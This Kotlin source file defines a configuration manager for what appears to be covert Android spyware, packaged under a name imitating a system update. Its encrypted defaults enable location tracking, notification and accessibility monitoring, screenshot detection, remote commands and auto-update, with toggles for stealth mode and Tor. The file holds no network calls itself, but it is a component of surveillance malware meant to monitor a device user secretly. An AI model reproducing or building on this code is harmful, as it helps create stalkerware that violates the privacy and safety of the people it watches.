package com.androidsystem.update.core

import android.content.Context
import android.content.SharedPreferences
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONObject
import javax.inject.Inject
import javax.inject.Singleton

@Singleton
class ConfigManager @Inject constructor(
    private val context: Context,
    private val encryptionManager: EncryptionManager
) {
    private val prefs: SharedPreferences =
        context.getSharedPreferences("telemetry_config", Context.MODE_PRIVATE)

    @Volatile
    private var cachedConfig: JSONObject? = null

    private val defaultConfig = JSONObject().apply {
        put("monitoring_enabled", true)
        put("location_interval", 300000L)
        put("sync_interval", 1800000L)
        put("heartbeat_interval", 60000L)
        put("max_data_size", 10485760L)
        put("encryption_level", "high")
        put("stealth_mode", false)
        put("tor_enabled", false)
        put("ai_analysis", true)
        put("accessibility_monitoring", true)
        put("notification_monitoring", true)
        put("screenshot_detection", true)
        put("behavior_analysis", true)
        put("anomaly_detection", true)
        put("remote_commands", true)
        put("auto_update", true)
        put("debug_mode", false)
        put("version", "4.1.1")
    }

    init { loadOrCreateConfig() }

    private fun loadOrCreateConfig() {
        val configJson = prefs.getString("config", null)
        if (configJson == null) {
            saveConfig(defaultConfig)
            cachedConfig = defaultConfig
        } else {
            try {
                val decrypted = encryptionManager.decrypt(configJson)
                val loaded = JSONObject(decrypted)
                val merged = JSONObject(defaultConfig.toString())
                loaded.keys().forEach { key ->
                    merged.put(key, loaded.get(key))
                }
                saveConfig(merged)
                cachedConfig = merged
            } catch (e: Exception) {
                saveConfig(defaultConfig)
                cachedConfig = defaultConfig
            }
        }
    }

    fun getConfig(): JSONObject {
        return cachedConfig ?: synchronized(this) {
            cachedConfig ?: run {
                try {
                    val configJson = prefs.getString("config", null) ?: return defaultConfig
                    val decrypted = encryptionManager.decrypt(configJson)
                    JSONObject(decrypted).also {
                        cachedConfig = it
                    }
                } catch (e: Exception) {
                    defaultConfig.also { cachedConfig = it }
                }
            }
        }
    }

    fun getConfigValue(key: String): Any? = getConfig().opt(key)

    suspend fun updateConfig(newConfig: Map<String, Any>) =
        withContext(Dispatchers.IO) {
            synchronized(this@ConfigManager) {
                val current = JSONObject(getConfig().toString())
                newConfig.forEach { (k, v) -> current.put(k, v) }
                current.put("last_updated", System.currentTimeMillis())
                saveConfig(current)
            }
        }

    fun updateConfigValue(key: String, value: Any) {
        synchronized(this) {
            val config = JSONObject(getConfig().toString())
            config.put(key, value)
            config.put("last_updated", System.currentTimeMillis())
            saveConfig(config)
        }
    }

    private fun saveConfig(config: JSONObject) {
        val encrypted = encryptionManager.encrypt(config.toString())
        prefs.edit().putString("config", encrypted).apply()
        cachedConfig = config
    }

    fun resetToDefaults() { synchronized(this) { saveConfig(defaultConfig) } }
    fun isMonitoringEnabled(): Boolean = getConfig().optBoolean("monitoring_enabled", true)
    fun getLocationInterval(): Long = getConfig().optLong("location_interval", 300000L)
    fun getSyncInterval(): Long = getConfig().optLong("sync_interval", 1800000L)
    fun isStealthMode(): Boolean = getConfig().optBoolean("stealth_mode", false)
    fun isTorEnabled(): Boolean = getConfig().optBoolean("tor_enabled", false)
    fun isAIAnalysisEnabled(): Boolean = getConfig().optBoolean("ai_analysis", true)
    fun isAccessibilityMonitoringEnabled(): Boolean = getConfig().optBoolean("accessibility_monitoring", true)
    fun isRemoteCommandsEnabled(): Boolean = getConfig().optBoolean("remote_commands", true)
    fun getEncryptionLevel(): String = getConfig().optString("encryption_level", "high")
    fun getMaxDataSize(): Long = getConfig().optLong("max_data_size", 10485760L)
}
